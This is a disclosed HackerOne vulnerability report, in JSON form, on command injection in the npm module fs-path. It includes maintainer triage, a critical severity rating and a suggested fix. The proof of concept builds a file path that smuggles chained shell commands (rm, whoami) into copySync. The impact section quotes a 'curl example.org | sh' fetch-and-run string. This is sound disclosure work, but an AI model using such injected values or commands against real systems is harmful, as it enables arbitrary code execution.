{"id":324491,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjQ0OTE=","url":"https://hackerone.com/reports/324491","title":"`fs-path` concatenates unsanitized input into exec()/execSync() commands","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2018-03-11T20:19:23.918Z","submitted_at":"2018-03-11T20:19:23.918Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"chalker","url":"/chalker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-05-11T15:19:57.573Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2018-05-11T15:19:47.808Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report command injection in `fs-path`.\nIt allows to inject and execute arbitrary shell commands while performing various operations from `fs-path` API like copying files.\n\n# Module\n\n**module name:** `fs-path`\n**version:** 0.0.24\n**npm page:** `https://www.npmjs.com/package/fs-path`\n\n## Module Description\n\n\u003e Useful file utitiles.\n\n## Module Stats\n\n108 downloads in the last day\n2 916 downloads in the last week\n13 186 downloads in the last month\n\n# Vulnerability\n\n## Vulnerability Description\n\nArguments are not properly escaped before being concatenated into the command that is passed to `exec()`/`execSync()`.\n\n See https://github.com/pillys/fs-path/blob/master/lib/index.js\n\n## Steps To Reproduce:\n\n```js\nconst fsPath = require('fs-path');\nconst source = '/bin/ls';\nconst target =  '/tmp/foo;rm\\t/tmp/foo;whoami\u003e\\t/tmp/bar';\nfsPath.copySync(source, target);\n```\n\nObserve `/tmp/bar` being created with `whoami` output.\n\nThe same issue affects other methods in `fs-path` API, not just `copySync`.\n\n## Patch\n\nThe suggested fix is to avoid using `exec`/`execSync` and instead pass parameters as an array of arguments to corresponding `child_process` methods.\n\n## Supporting Material/References:\n\n* Arch Linux current\n* Node.js 9.7.1\n* npm 5.7.1\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nFor setups where user input could end up in arguments of calls to `fs-wrap` API (like filename etc), users would be able to execute arbitrary shell commands.\n\nNote that sanitization of user input on the application side might not prevent this issue, as simple path sanitization that removes stuff `/` and `..` is not enough — commands like `curl example.org | sh` might pass through sanitization of user input (like filenames etc.) on the application side.","vulnerability_information_html":"\u003cp\u003eI would like to report command injection in \u003ccode\u003efs-path\u003c/code\u003e.\u003cbr\u003e\nIt allows to inject and execute arbitrary shell commands while performing various operations from \u003ccode\u003efs-path\u003c/code\u003e API like copying files.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e \u003ccode\u003efs-path\u003c/code\u003e\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 0.0.24\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/fs-path\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eUseful file utitiles.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e108 downloads in the last day\u003cbr\u003e\n2 916 downloads in the last week\u003cbr\u003e\n13 186 downloads in the last month\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003eArguments are not properly escaped before being concatenated into the command that is passed to \u003ccode\u003eexec()\u003c/code\u003e/\u003ccode\u003eexecSync()\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eSee \u003ca title=\"https://github.com/pillys/fs-path/blob/master/lib/index.js\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fpillys%2Ffs-path%2Fblob%2Fmaster%2Flib%2Findex.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/pillys/fs-path/blob/master/lib/index.js\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003efsPath\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003efs-path\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003esource\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/bin/ls\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003etarget\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e  \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/tmp/foo;rm\u003c/span\u003e\u003cspan class=\"se\"\u003e\\t\u003c/span\u003e\u003cspan class=\"s1\"\u003e/tmp/foo;whoami\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\t\u003c/span\u003e\u003cspan class=\"s1\"\u003e/tmp/bar\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nx\"\u003efsPath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecopySync\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003esource\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003etarget\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eObserve \u003ccode\u003e/tmp/bar\u003c/code\u003e being created with \u003ccode\u003ewhoami\u003c/code\u003e output.\u003c/p\u003e\n\n\u003cp\u003eThe same issue affects other methods in \u003ccode\u003efs-path\u003c/code\u003e API, not just \u003ccode\u003ecopySync\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch2 id=\"patch\"\u003ePatch\u003c/h2\u003e\n\n\u003cp\u003eThe suggested fix is to avoid using \u003ccode\u003eexec\u003c/code\u003e/\u003ccode\u003eexecSync\u003c/code\u003e and instead pass parameters as an array of arguments to corresponding \u003ccode\u003echild_process\u003c/code\u003e methods.\u003c/p\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eArch Linux current\u003c/li\u003e\n\u003cli\u003eNode.js 9.7.1\u003c/li\u003e\n\u003cli\u003enpm 5.7.1\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: N\u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: N\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eFor setups where user input could end up in arguments of calls to \u003ccode\u003efs-wrap\u003c/code\u003e API (like filename etc), users would be able to execute arbitrary shell commands.\u003c/p\u003e\n\n\u003cp\u003eNote that sanitization of user input on the application side might not prevent this issue, as simple path sanitization that removes stuff \u003ccode\u003e/\u003c/code\u003e and \u003ccode\u003e..\u003c/code\u003e is not enough — commands like \u003ccode\u003ecurl example.org | sh\u003c/code\u003e might pass through sanitization of user input (like filenames etc.) on the application side.\u003c/p\u003e\n","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-06-10T15:19:47.876Z","allow_singular_disclosure_after":-80576147.47783059,"singular_disclosure_allowed":true,"vote_count":1,"voters":["0x08"],"severity":{"rating":"critical","score":9.6,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"none","availability":"high"}},"structured_scope":{"databaseId":9378,"asset_type":"SOURCE_CODE","asset_identifier":"fs-path","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2481694,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-12T07:11:17.206Z","updated_at":"2018-03-12T07:11:17.206Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2481698,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nThanks for reporting this issue.\n\nI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\nI will invite the package maintainer to this issue.\n","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eThanks for reporting this issue.\u003c/p\u003e\n\n\u003cp\u003eI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\u003cbr\u003e\nI will invite the package maintainer to this issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-12T07:11:55.917Z","updated_at":"2018-03-12T07:11:55.917Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2661147,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@chalker due to no activity from the maintainer, how do you feel about disclosing this report?","markdown_message":"\u003cp\u003e\u003ca href=\"/chalker\"\u003e@chalker\u003c/a\u003e due to no activity from the maintainer, how do you feel about disclosing this report?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-24T20:01:24.310Z","updated_at":"2018-04-24T20:01:24.310Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2728721,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'm fine with the disclosure.\n\nDepsdb output:\n```\nQuery: \"fs-path@\n10211   fs-path\n2343    gulp-version-number\n1200    gulp-axe-webdriver\n886     font-plugins-plus\n645     jdfx\n…\n```","markdown_message":"\u003cp\u003eI\u0026#39;m fine with the disclosure.\u003c/p\u003e\n\n\u003cp\u003eDepsdb output:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eQuery: \u0026quot;fs-path@\n10211   fs-path\n2343    gulp-version-number\n1200    gulp-axe-webdriver\n886     font-plugins-plus\n645     jdfx\n…\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2018-05-11T09:22:29.436Z","updated_at":"2018-05-11T09:22:41.836Z","actor":{"username":"chalker","cleared":false,"url":"/chalker","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2729605,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-11T15:19:23.380Z","updated_at":"2018-05-11T15:19:23.380Z","additional_data":{"old_severity":"High","new_severity":"Critical (9.6)","old_severity_id":127403,"new_severity_id":152417},"actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2729609,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-11T15:19:39.777Z","updated_at":"2018-05-11T15:19:39.777Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"chalker","url":"/chalker"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2729611,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-11T15:19:47.837Z","updated_at":"2018-05-11T15:19:47.837Z","first_to_agree":true,"actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2729612,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-11T15:19:57.484Z","updated_at":"2018-05-11T15:19:57.484Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2764954,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-19T07:23:07.655Z","updated_at":"2018-05-19T07:23:07.655Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"old_scope":"Other module","new_scope":"fs-path","genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}